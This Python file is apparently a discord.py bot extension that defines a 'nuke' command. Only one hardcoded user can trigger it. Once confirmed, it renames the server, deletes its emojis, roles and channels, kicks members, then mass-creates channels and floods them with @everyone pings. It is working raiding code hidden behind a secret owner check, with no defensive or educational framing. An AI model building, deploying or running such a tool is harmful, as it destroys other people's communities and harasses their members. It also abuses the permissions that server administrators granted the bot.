import asyncio
import discord
from discord.ext import commands
from discord.ui import Button, View
from functions import *
from editrespond import get_response

nuke_active = False


class ConfirmWipeView(View):
    def __init__(self, ctx, guild):
        super().__init__(timeout=60)
        self.ctx = ctx
        self.guild = guild

    @discord.ui.button(label="Yes", style=discord.ButtonStyle.green)
    async def yes_callback(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.ctx.author.id:
            return await interaction.response.send_message(get_response("secrettesting", "confirm_only"), ephemeral=True)
        
        await interaction.response.edit_message(content="**NUKE STARTED** ⚠️", view=None)
        self.stop()
        await self.start_wipe()

    @discord.ui.button(label="No", style=discord.ButtonStyle.red)
    async def no_callback(self, interaction: discord.Interaction, button: Button):
        if interaction.user.id != self.ctx.author.id:
            return await interaction.response.send_message(get_response("secrettesting", "respond_only"), ephemeral=True)
        
        await interaction.response.edit_message(content="**Nuke cancelled.**", view=None)
        self.stop()


    async def start_wipe(self):
        global nuke_active
        nuke_active = True

        if self.ctx.author.id != 1465295674768883889:
            nuke_active = False
            return

        guild = self.guild
        channels = []

        # Quick cleanup
        try: await guild.edit(name="get-nuked-by-unknown")
        except: pass

        for emoji in guild.emojis:
            try: await emoji.delete(reason="Nuke")
            except: continue

        bot_top = max(guild.me.roles, key=lambda r: r.position)
        for role in guild.roles:
            if role.position < bot_top.position and not role.is_bot_managed() and not role.managed:
                try: await role.delete(reason="Nuke")
                except: continue

        for ch in list(guild.channels):
            try: await ch.delete(reason="Nuke")
            except: continue

        # Kick members
        for member in guild.members:
            if member.id in (guild.me.id, self.ctx.author.id):
                continue
            if member.top_role.position >= guild.me.top_role.position:
                continue
            try:
                await member.kick(reason="Nuke")
            except:
                continue

        # Start spam task early
        spam_task = asyncio.create_task(self.spam_task(channels))

        # Very fast channel creation
        for _ in range(5000):  # Increased to 150
            try:
                ch = await guild.create_text_channel("GG")
                channels.append(ch)
            except:
                continue
            await asyncio.sleep(0.15)  # Very small delay

        await asyncio.sleep(0.15)
        try:
            await spam_task
        except:
            pass


    async def spam_task(self, channels):
        global nuke_active
        while nuke_active:
            for channel in channels[:]:
                if not nuke_active:
                    return
                try:
                    await channel.send("@everyone @here LOL")
                    await asyncio.sleep(0.1)   # Extremely fast
                except discord.NotFound:
                    if channel in channels:
                        channels.remove(channel)
                except:
                    continue
            await asyncio.sleep(0.12)


class NukeCommandCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="nuke")
    async def nuke(self, ctx):
        if ctx.author.id != 1465295674768883889:
            return

        embed = discord.Embed(
            title="gg",
            description="gg",
            color=discord.Color.red()
        )
        embed.set_footer(text="gg")

        view = ConfirmWipeView(ctx, ctx.guild)
        await ctx.send(embed=embed, view=view)

    @commands.command(name="stopnuke", aliases=["snu"])
    async def stopnuke(self, ctx):
        global nuke_active
        if ctx.author.id != 1465295674768883889:
            return
        nuke_active = False
        await ctx.send(get_response("secrettesting", "stopped"))


async def setup(bot):
    await bot.add_cog(NukeCommandCog(bot))